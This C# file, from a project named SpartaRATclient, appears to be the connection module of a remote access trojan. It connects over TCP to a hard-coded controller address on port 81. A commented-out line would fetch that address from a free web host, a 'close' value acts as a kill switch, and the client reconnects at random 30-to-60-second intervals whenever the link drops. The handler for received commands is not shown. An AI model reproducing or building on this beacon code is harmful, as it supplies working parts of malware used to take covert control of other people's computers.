using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Text.RegularExpressions;

namespace SpartaRATclient
{
    public class SocketClientClass
    {
        private Socket ServerSocket;
        private IPEndPoint ipe;
        public SocketClientClass()
        {
            this.ServerSocket = SetSocket();
            this.ipe = SetIpAddress();
        }

        private static Socket SetSocket()
        {
            return new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        private static IPEndPoint SetIpAddress()
        {
            String GetIpAddress()
            {
                string ipaddress;
                WebClient site = new WebClient();
                while (true)
                {
                    try
                    {
                        // ipaddress = site.DownloadString("https://mysimpleweb054.000webhostapp.com/mysite/detail"); //myproject054 - username
                        ipaddress = "192.168.1.18"; //or change to anything else
                        if (ipaddress == "")
                            throw new Exception();
                        else if (ipaddress == "close")
                            Environment.Exit(0); //If i dont want the program to run anywhere
                        break;
                    }
                    catch { Thread.Sleep(30000); }
                }
                return ipaddress;
            }
           
            return new IPEndPoint(IPAddress.Parse(GetIpAddress()), 81);
        }

        public void Connect()
        {
            try
            {
                this.ServerSocket.Connect(this.ipe);
                Server server = new Server(ServerSocket);

                //reading data from server. when lost connection it will return and then Recconect()
                server.Receive();
            }
            catch
            {
                Random _ = new Random();
                Thread.Sleep(_.Next(30000, 60000));
            }
            Reconnect();
        }

        public void Reconnect()
        {
            this.ServerSocket = SetSocket();
            this.ipe = SetIpAddress();
            this.Connect();
        }
    }
}